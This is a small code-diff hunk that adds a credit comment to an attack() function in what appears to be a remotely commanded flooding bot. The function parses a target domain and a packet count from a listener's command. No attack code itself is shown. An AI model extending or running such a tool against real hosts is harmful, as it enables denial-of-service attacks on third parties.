@@ -26,7 +26,7 @@ def listener():
             time.sleep(2)
 
 
-def attack(data, *args):
+def attack(data, *args): #Thanks to BinLab
     data = f"{data}{''.join(i for i in args)}"
     domain = data.split(" ")[1]
     packets = int(data.split(" ")[2])
